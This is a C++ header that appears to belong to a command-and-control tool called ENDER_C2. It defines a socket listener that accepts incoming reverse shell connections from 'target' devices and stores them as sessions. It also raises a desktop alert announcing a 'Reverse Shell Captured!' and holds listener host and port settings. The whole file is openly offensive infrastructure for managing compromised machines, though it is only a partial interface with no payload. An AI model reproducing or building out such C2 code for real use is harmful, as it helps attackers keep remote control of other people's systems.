#ifndef ENDER_C2_
#define ENDER_C2_
// This is a interface for the C2

#include <iostream>
#include <fstream>
#include <ctime>
#include <random>

#include <string>
#include <cstring>
#include <vector>
#include <cstdlib>
#include <chrono>
#include <thread>

#include <ifaddrs.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h> // for the struct timeval
#include <netinet/tcp.h> // for TCP_NODELAY

/*
    Connected Devices will hold general data including:
    IP, PORT, DEVICE_NAME, OS, SHELL_USER
*/

// global server variables

struct sockaddr_in server_address;
int server_socket;
bool serverShutDown = false;

// socket connection class
class ShellConnection
{
    public:
        ShellConnection(){};
        ShellConnection(int server_info)
        {
            // Accept a connection
            client_address_size = sizeof(client_address);
            client_socket = accept(server_info, (struct sockaddr *)&client_address, &client_address_size);
            if (client_socket == -1) {
                perror("accept");
                // close(server_socket);
            }

            // Usage TCP_NODELAY option to disable Nagle algorithm
            // allowing us to have faster packet send possibly
            int enable = 1;
            if (setsockopt(client_socket, IPPROTO_TCP, TCP_NODELAY, (const char*)&enable, sizeof(enable)) == -1) {
                perror("setsockopt");
                close(client_socket);
            }

            if (!serverShutDown)
            {
                // creates a pop-up in the Linux desktop
                system("DD=$(date) && notify-send \"[+] Reverse Shell Captured! $DD\"");
            }
        };

        int GetSocket() { return client_socket; };
        std::string GetSocketOS() { return sysOS; };
        std::string GetShellUser() { return shellUser; };
    private:
        struct sockaddr_in client_address;
        socklen_t client_address_size;
        int client_socket;
        std::string sysOS = "", shellUser = "";
};

// This is a dynamic container used to store multiple
// sessions that are fetched by the Socket Server
std::vector<ShellConnection> sessions;

/*
    This when running created a central collector
    that handles shell sessions coming from external
    devices.

    The general set-up is all hosted inside local-terminal
    we can handle capturing multiple incoming sessions in
    the background when focused on a target system
*/

class CentralCore
{
    public:
        CentralCore()
        {
            LHOST = "127.0.0.1";
            LPORT = 19283;
        };

        int getCentralPort() { return LPORT; };
        std::string getCentralHost() { return LHOST; };
        void setCentralPort(int port_) { LPORT = port_; };
        void setCentralHost(std::string ip_) { LHOST = ip_; };

        void displayDevices()
        {
            for (size_t i = 0; i < sessions.size(); ++i)
            {
                std::cout << ":: " << i << " | " << sessions[i].GetShellUser() << "\n";
            }
        }

    private:
        int LPORT;
        std::string LHOST;
};

#endif
